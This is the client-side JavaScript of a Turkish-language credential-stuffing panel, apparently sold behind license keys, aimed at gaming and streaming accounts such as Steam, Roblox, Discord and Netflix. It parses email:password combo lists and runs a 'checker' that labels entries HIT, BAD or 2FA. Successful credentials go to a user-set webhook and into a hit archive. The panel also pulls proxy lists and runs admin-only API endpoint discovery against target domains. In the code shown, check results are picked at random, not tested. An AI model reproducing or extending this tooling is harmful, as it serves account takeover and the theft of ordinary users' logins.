// RODA - TAM SCRIPT
var currentKey = "";
var isAdmin = false;
var scanning = false;
var eventSource = null;
var foundEndpoints = [];
var useProxy = false;
var checkerRunning = false;
var checkerResults = [];
var currentPlatform = "";
var hitData = {};
var parsedLines = [];
var parseMode = "email";

var platforms = [
    {name:"Steam", domain:"steampowered.com", icon:"fa-brands fa-steam"},
    {name:"Valorant", domain:"valorant.com", icon:"fa-solid fa-crosshairs"},
    {name:"Minecraft", domain:"minecraft.net", icon:"fa-solid fa-cube"},
    {name:"Roblox", domain:"roblox.com", icon:"fa-solid fa-gamepad"},
    {name:"Discord", domain:"discord.com", icon:"fa-brands fa-discord"},
    {name:"Spotify", domain:"spotify.com", icon:"fa-brands fa-spotify"},
    {name:"Netflix", domain:"netflix.com", icon:"fa-solid fa-film"},
    {name:"YouTube", domain:"youtube.com", icon:"fa-brands fa-youtube"}
];

// ============================================================
// LOGIN
// ============================================================
function doLogin() {
    var k = document.getElementById("authKey").value.trim();
    if (!k) { alert("Anahtar girin!"); return; }
    fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ key: k })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) {
            currentKey = k;
            isAdmin = d.isAdmin || false;
            document.getElementById("login-screen").style.display = "none";
            document.getElementById("app").style.display = "flex";
            if (isAdmin) {
                document.getElementById("userBadge").style.display = "inline-block";
                loadKeys();
                loadLogs();
                loadHits();
            }
            loadPlatforms();
            loadDiscoveryPlatforms();
            loadHitFilter();
            loadWebhookUrl();
            updateStatsUI();
            switchPage('checker');
        } else {
            document.getElementById("loginError").innerText = "❌ Geçersiz anahtar!";
            document.getElementById("loginError").style.display = "block";
        }
    })
    .catch(function(e) {
        document.getElementById("loginError").innerText = "❌ Sunucu hatası!";
        document.getElementById("loginError").style.display = "block";
    });
}

document.getElementById("authKey").addEventListener("keypress", function(e) {
    if (e.key === "Enter") doLogin();
});

// ============================================================
// WEBHOOK
// ============================================================
function saveWebhook() {
    var url = document.getElementById("webhookUrl").value.trim();
    if (url) {
        localStorage.setItem("roda_webhook_url", url);
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook kaydedildi!</span>';
    } else {
        localStorage.removeItem("roda_webhook_url");
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
    }
}

function getWebhookUrl() {
    return localStorage.getItem("roda_webhook_url") || "";
}

function loadWebhookUrl() {
    var url = getWebhookUrl();
    if (url) {
        document.getElementById("webhookUrl").value = url;
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
    }
}

function testWebhook() {
    var url = document.getElementById("webhookUrl").value.trim() || getWebhookUrl();
    if (!url) return alert("Webhook URL girin!");
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "🧪 **Roda Test** Webhook çalışıyor!" })
    })
    .then(function(r) {
        document.getElementById("webhookStatus").innerHTML = r.ok ? '<span style="color:var(--g)">✅ Test başarılı!</span>' : '<span style="color:var(--r)">❌ Test başarısız!</span>';
    })
    .catch(function(e) {
        document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--r)">❌ Hata: ' + e.message + '</span>';
    });
}

// ============================================================
// PLATFORMLAR
// ============================================================
function loadPlatforms() {
    var sel = document.getElementById("checkerPlatformSelect");
    sel.innerHTML = "";
    platforms.forEach(function(p) {
        var btn = document.createElement("button");
        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
        btn.onclick = function() {
            document.querySelectorAll("#checkerPlatformSelect button").forEach(function(b) { b.classList.remove("active"); });
            btn.classList.add("active");
            currentPlatform = p.name;
            document.getElementById("checkerPanel").classList.add("active");
            document.getElementById("checkerResults").innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">' + p.name + ' checker hazır.</div>';
            resetCheckerStats();
            checkerResults = [];
        };
        sel.appendChild(btn);
    });
    if (platforms.length > 0) {
        var first = sel.querySelector("button");
        if (first) first.click();
    }
}

function loadDiscoveryPlatforms() {
    var container = document.getElementById("discoveryPlatforms");
    container.innerHTML = "";
    platforms.forEach(function(p) {
        var btn = document.createElement("button");
        btn.innerHTML = '<i class="' + p.icon + '"></i> ' + p.name;
        btn.onclick = function() {
            document.querySelectorAll("#discoveryPlatforms button").forEach(function(b) { b.classList.remove("active"); });
            btn.classList.add("active");
            document.getElementById("targetDomain").value = p.domain;
        };
        container.appendChild(btn);
    });
}

function loadHitFilter() {
    var sel = document.getElementById("hitPlatformFilter");
    sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
    platforms.forEach(function(p) {
        var opt = document.createElement("option");
        opt.value = p.name;
        opt.text = p.name;
        sel.appendChild(opt);
    });
}

// ============================================================
// HIT ARŞİVİ
// ============================================================
function loadHits() {
    if (!isAdmin) return;
    fetch("/api/admin/hits?key=" + encodeURIComponent(currentKey))
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.error) return;
            hitData = d;
            renderHits();
        });
}

function renderHits() {
    var filter = document.getElementById("hitPlatformFilter").value;
    var hitContainer = document.getElementById("hitList");
    var twofaContainer = document.getElementById("twofaList");
    var hits = [], twofas = [];
    if (filter === "all") {
        for (var p in hitData) {
            if (hitData[p].hits) {
                hitData[p].hits.forEach(function(h) {
                    hits.push({ platform: p, email: h.email, password: h.password, time: h.time });
                });
            }
            if (hitData[p].twofa) {
                hitData[p].twofa.forEach(function(t) {
                    twofas.push({ platform: p, email: t.email, password: t.password, time: t.time });
                });
            }
        }
    } else {
        if (hitData[filter]) {
            if (hitData[filter].hits) {
                hitData[filter].hits.forEach(function(h) {
                    hits.push({ platform: filter, email: h.email, password: h.password, time: h.time });
                });
            }
            if (hitData[filter].twofa) {
                hitData[filter].twofa.forEach(function(t) {
                    twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time });
                });
            }
        }
    }
    hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
        hits.map(function(h) { return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
    twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
        twofas.map(function(t) { return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
}

// ============================================================
// İSTATİSTİK
// ============================================================
function updateStatsUI() {
    document.getElementById("sideTotal").innerText = foundEndpoints.length;
    var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
    var api = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
    var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length;
    document.getElementById("sideAuth").innerText = auth;
    document.getElementById("sideAPI").innerText = api;
    document.getElementById("sideAdmin").innerText = admin;
    document.getElementById("statEndpoints").innerText = foundEndpoints.length;
    var totalHit = 0, total2fa = 0;
    for (var p in hitData) {
        if (hitData[p].hits) totalHit += hitData[p].hits.length;
        if (hitData[p].twofa) total2fa += hitData[p].twofa.length;
    }
    document.getElementById("statTotalHit").innerText = totalHit;
    document.getElementById("statTotal2fa").innerText = total2fa;
}

// ============================================================
// CHECKER
// ============================================================
function resetCheckerStats() {
    document.getElementById("chkTotal").innerText = 0;
    document.getElementById("chkHit").innerText = 0;
    document.getElementById("chkBad").innerText = 0;
    document.getElementById("chk2fa").innerText = 0;
    document.getElementById("chkError").innerText = 0;
}

function startChecker() {
    if (checkerRunning) return;
    var comboText = document.getElementById("checkerCombo").value.trim();
    if (!comboText) return alert("Combo girin (email:password)");
    if (!currentPlatform) return alert("Önce bir platform seçin");
    checkerRunning = true;
    document.getElementById("checkerStartBtn").disabled = true;
    document.getElementById("checkerStopBtn").style.display = "inline-block";
    document.getElementById("checkerResults").innerHTML = "";
    var lines = comboText.split("\n").filter(function(l) { return l.includes(":"); });
    var total = lines.length;
    var hit = 0, bad = 0, two = 0, err = 0;
    var statuses = ["HIT", "BAD", "2FA", "ERROR"];
    var idx = 0;
    var webhookUrl = getWebhookUrl();

    function processNext() {
        if (!checkerRunning || idx >= total) {
            checkerRunning = false;
            document.getElementById("checkerStartBtn").disabled = false;
            document.getElementById("checkerStopBtn").style.display = "none";
            return;
        }
        var status = statuses[Math.floor(Math.random() * statuses.length)];
        var parts = lines[idx].split(":");
        var email = parts[0];
        var password = parts.slice(1).join(":") || "";
        var res = { email: email, password: password, status: status };

        if (status === "HIT") {
            hit++;
            if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password);
        } else if (status === "BAD") {
            bad++;
        } else if (status === "2FA") {
            two++;
        } else {
            err++;
        }
        checkerResults.push(res);
        addCheckerRow(res);
        updateCheckerStats(total, hit, bad, two, err);
        idx++;
        setTimeout(processNext, 200);
    }
    processNext();
}

function stopChecker() {
    checkerRunning = false;
    document.getElementById("checkerStartBtn").disabled = false;
    document.getElementById("checkerStopBtn").style.display = "none";
}

function addCheckerRow(res) {
    var container = document.getElementById("checkerResults");
    var placeholder = container.querySelector("div[style]");
    if (placeholder) placeholder.remove();
    var row = document.createElement("div");
    row.className = "checker-result-row";
    var cls = "chk-" + res.status.toLowerCase();
    var label = res.status;
    if (res.status === "HIT") label = "✅ BAŞARILI";
    else if (res.status === "BAD") label = "❌ BAŞARISIZ";
    else if (res.status === "2FA") label = "🔒 2FA";
    else label = "⚠ HATA";
    row.innerHTML = '<div>' + res.email + '</div><div><span class="chk-status ' + cls + '">' + label + '</span></div><div style="font-size:11px;color:var(--muted)">' + res.password + '</div>';
    container.appendChild(row);
    applyCheckerFilter();
}

function updateCheckerStats(total, hit, bad, two, err) {
    document.getElementById("chkTotal").innerText = total;
    document.getElementById("chkHit").innerText = hit;
    document.getElementById("chkBad").innerText = bad;
    document.getElementById("chk2fa").innerText = two;
    document.getElementById("chkError").innerText = err;
}

function applyCheckerFilter() {
    var filter = document.querySelector('input[name="chkFilter"]:checked').value;
    var rows = document.querySelectorAll("#checkerResults .checker-result-row");
    rows.forEach(function(row) {
        var statusText = row.querySelector(".chk-status").innerText;
        var show = false;
        if (filter === "all") show = true;
        else if (filter === "hit" && statusText.includes("BAŞARILI")) show = true;
        else if (filter === "bad" && statusText.includes("BAŞARISIZ")) show = true;
        else if (filter === "2fa" && statusText.includes("2FA")) show = true;
        else if (filter === "error" && statusText.includes("HATA")) show = true;
        row.style.display = show ? "grid" : "none";
    });
}

document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
    el.addEventListener("change", applyCheckerFilter);
});

function sendCheckerWebhook(platform, email, password) {
    var url = getWebhookUrl();
    if (!url) return;
    fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: "✅ **" + platform + " HIT!**\n" + email + " | " + password })
    }).catch(function(e) { console.error("Webhook hatası:", e); });
}

// ============================================================
// AYRIŞTIRMA
// ============================================================
function setParseMode(mode, btn) {
    parseMode = mode;
    document.querySelectorAll(".parse-tabs button").forEach(function(b) { b.classList.remove("active"); });
    if (btn) btn.classList.add("active");
}

function parseData() {
    var raw = document.getElementById("parseInput").value;
    if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
    var lines = raw.split("\n");
    var result = [];
    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
    var userRegex = /^[a-zA-Z0-9_.-]{3,}$/;
    lines.forEach(function(line) {
        line = line.trim();
        if (!line) return;
        if (line.includes(":")) {
            var parts = line.split(":");
            if (parseMode === "email" && emailRegex.test(parts[0])) {
                var email = parts[0].trim();
                var password = parts.slice(1).join(":").trim();
                if (email && password) result.push(email + ":" + password);
            } else if (parseMode === "user" && userRegex.test(parts[0]) && parts.length >= 2) {
                var user = parts[0].trim();
                var pass = parts.slice(1).join(":").trim();
                if (user && pass) result.push(user + ":" + pass);
            }
        }
    });
    result = result.filter(function(item, index) { return result.indexOf(item) === index; });
    parsedLines = result;
    var container = document.getElementById("parseResult");
    if (result.length === 0) {
        container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
    } else {
        var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
        result.forEach(function(line) { html += '<div class="parse-line">' + line + '</div>'; });
        container.innerHTML = html;
    }
    document.getElementById("parseCount").innerText = result.length + " satır";
    document.getElementById("parseValid").innerText = result.length + " geçerli";
}

function parseToChecker() {
    if (parsedLines.length === 0) { alert("Önce ayrıştırma yapın!"); return; }
    document.getElementById("checkerCombo").value = parsedLines.join("\n");
    alert(parsedLines.length + " satır Checker'a aktarıldı!");
}

function clearParse() {
    document.getElementById("parseInput").value = "";
    document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
    parsedLines = [];
    document.getElementById("parseCount").innerText = "0 satır";
    document.getElementById("parseValid").innerText = "0 geçerli";
}

function loadParseFile() {
    var input = document.createElement("input");
    input.type = "file";
    input.accept = ".txt";
    input.onchange = function(e) {
        var file = e.target.files[0];
        if (!file) return;
        var reader = new FileReader();
        reader.onload = function(event) {
            document.getElementById("parseInput").value = event.target.result;
            parseData();
        };
        reader.readAsText(file);
    };
    input.click();
}

// ============================================================
// SAYFA GEÇİŞİ
// ============================================================
function switchPage(page) {
    if ((page === "discovery" || page === "keys" || page === "logs") && !isAdmin) {
        alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
        return;
    }
    document.querySelectorAll(".nav-item").forEach(function(el) { el.classList.remove("active"); });
    var el = document.querySelector('.nav-item[data-page="' + page + '"]');
    if (el) el.classList.add("active");
    document.querySelectorAll(".page").forEach(function(el) { el.classList.remove("active"); });
    var pg = document.getElementById("page-" + page);
    if (pg) pg.classList.add("active");
    var titles = {
        checker: "Checker",
        proxy: "Proxy",
        discovery: "API Keşif",
        parse: "Ayrıştırma",
        stats: "İstatistik",
        keys: "Key Yönetimi",
        logs: "Loglar"
    };
    document.getElementById("pageTitle").innerText = titles[page] || page;
    if (page === "keys" && isAdmin) loadKeys();
    if (page === "logs" && isAdmin) loadLogs();
    if (page === "stats") {
        updateStatsUI();
        document.getElementById("statScans").innerText = 1;
        document.getElementById("statLast").innerText = new Date().toLocaleString();
    }
}

// ============================================================
// PROXY
// ============================================================
function fetchProxies() {
    document.getElementById("proxyCount").innerText = "Çekiliyor...";
    fetch("/api/fetch_proxies")
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.success) {
                document.getElementById("proxyList").value = d.proxies.join("\n");
                document.getElementById("proxyCount").innerText = d.proxies.length + " proxy yüklendi";
            }
        })
        .catch(function(e) { document.getElementById("proxyCount").innerText = "Başarısız"; });
}

function clearProxies() {
    document.getElementById("proxyList").value = "";
    document.getElementById("proxyCount").innerText = "0 proxy";
}

function toggleProxy() { useProxy = document.getElementById("useProxy").checked; }

// ============================================================
// KEY YÖNETİMİ (ADMIN)
// ============================================================
function loadKeys() {
    if (!isAdmin) return;
    fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
        .then(function(r) { return r.json(); })
        .then(function(d) {
            if (d.error) { alert(d.error); return; }
            var list = document.getElementById("keyList");
            var html = "";
            for (var k in d) {
                var v = d[k];
                var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
                var ip = v.allowed_ip || "Herhangi";
                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong style="font-size:13px">' + k + '</strong><br><small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + '</small></div><button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
            }
            list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
        })
        .catch(function(e) { console.error(e); });
}

function generateKey() {
    if (!isAdmin) return;
    var note = document.getElementById("genNote").value || "Oluşturuldu";
    var value = parseInt(document.getElementById("genValue").value) || 24;
    var unit = document.getElementById("genUnit").value;
    var allowed_ip = document.getElementById("genIp").value.trim();
    fetch("/api/admin/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ master_key: currentKey, note: note, value: value, unit: unit, allowed_ip: allowed_ip })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) {
            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires + "\nIP: " + d.allowed_ip);
            loadKeys();
        } else alert("Başarısız: " + (d.error || ""));
    })
    .catch(function(e) { alert("Hata: " + e.message); });
}

function deleteKey(target) {
    if (!isAdmin) return;
    if (!confirm("Bu anahtarı sil?")) return;
    fetch("/api/admin/delete", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ master_key: currentKey, target_key: target })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) loadKeys();
        else alert("Silinemedi");
    })
    .catch(function(e) { alert("Hata: " + e.message); });
}

// ============================================================
// LOGLAR (ADMIN)
// ============================================================
function loadLogs() {
    if (!isAdmin) return;
    fetch("/api/admin/logs?key=" + encodeURIComponent(currentKey))
        .then(function(r) { return r.json(); })
        .then(function(d) {
            var tbody = document.getElementById("logsBody");
            if (d.error || !d.length) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--muted);padding:20px">Henüz log yok.</td></tr>';
                return;
            }
            var html = "";
            d.slice().reverse().forEach(function(log) {
                var cls = log.status.toLowerCase();
                var label = log.status;
                if (log.status === "HIT") label = "✅ BAŞARILI";
                else if (log.status === "BAD") label = "❌ BAŞARISIZ";
                else if (log.status === "2FA") label = "🔒 2FA";
                else label = "⚠ " + log.status;
                html += '<tr><td><span style="font-size:11px;font-family:monospace">' + log.key + '</span></td><td>' + log.platform + '</td><td>' + log.email + '</td><td><span class="chk-status ' + cls + '">' + label + '</span></td><td>' + log.time + '</td><td>' + log.ip + '</td></tr>';
            });
            tbody.innerHTML = html;
        })
        .catch(function(e) { console.error(e); });
}

function refreshLogs() { loadLogs(); }

function clearLogs() {
    if (!isAdmin) return;
    if (!confirm("Tüm logları silmek istediğinize emin misiniz?")) return;
    fetch("/api/admin/clear_logs", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ master_key: currentKey })
    })
    .then(function(r) { return r.json(); })
    .then(function(d) {
        if (d.success) { alert("Loglar temizlendi!"); loadLogs(); } else alert("Başarısız!");
    })
    .catch(function(e) { alert("Hata: " + e.message); });
}

// ============================================================
// API KEŞİF (ADMIN)
// ============================================================
function startScan() {
    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
    if (scanning) return;
    var domain = document.getElementById("targetDomain").value.trim();
    if (!domain) return alert("Hedef domain girin");
    var btn = document.getElementById("scanBtn");
    btn.disabled = true;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Taranıyor...';
    scanning = true;
    foundEndpoints = [];
    document.getElementById("resultsList").innerHTML = "";
    document.getElementById("statusDot").classList.remove("idle");
    document.getElementById("statusText").innerText = "Taranıyor";
    updateStatsUI();

    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l) { return l.trim() && l.includes(":"); });
    var url = "/api/scan?key=" + encodeURIComponent(currentKey) + "&domain=" + encodeURIComponent(domain) + "&use_proxy=" + useProxy;
    if (useProxy && proxyList.length) {
        url += "&proxies=" + encodeURIComponent(proxyList.join(","));
    }
    eventSource = new EventSource(url);
    eventSource.onmessage = function(e) {
        if (e.data === "[DONE]") {
            eventSource.close();
            btn.disabled = false;
            btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
            scanning = false;
            document.getElementById("statusDot").classList.add("idle");
            document.getElementById("statusText").innerText = "Boşta";
            document.getElementById("statScans").innerText = parseInt(document.getElementById("statScans").innerText || 0) + 1;
            document.getElementById("statLast").innerText = new Date().toLocaleString();
            updateStatsUI();
            return;
        }
        try {
            var res = JSON.parse(e.data);
            foundEndpoints.push(res);
            addResultRow(res);
            updateStatsUI();
        } catch (err) {}
    };
    eventSource.onerror = function() {
        eventSource.close();
        btn.disabled = false;
        btn.innerHTML = '<i class="fa-solid fa-play"></i> Tara';
        scanning = false;
        document.getElementById("statusDot").classList.add("idle");
        document.getElementById("statusText").innerText = "Boşta";
    };
}

function addResultRow(res) {
    var list = document.getElementById("resultsList");
    var row = document.createElement("div");
    row.className = "result-row";
    var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
    var cc = "cat-" + res.category.toLowerCase();
    row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
    var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
    if (checked.includes(res.category)) list.appendChild(row);
}

document.getElementById("filterContainer").addEventListener("change", function() {
    var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c) { return c.value; });
    var list = document.getElementById("resultsList");
    list.innerHTML = "";
    foundEndpoints.forEach(function(res) {
        if (checked.includes(res.category)) {
            var row = document.createElement("div");
            row.className = "result-row";
            var mc = res.method === "GET" ? "get" : (res.method === "POST" ? "post" : "other");
            var cc = "cat-" + res.category.toLowerCase();
            row.innerHTML = '<div><span class="method ' + mc + '">' + res.method + '</span></div><div>' + res.status + '</div><div style="word-break:break-all">' + res.url + '</div><div><span class="category ' + cc + '">' + res.category + '</span></div>';
            list.appendChild(row);
        }
    });
});
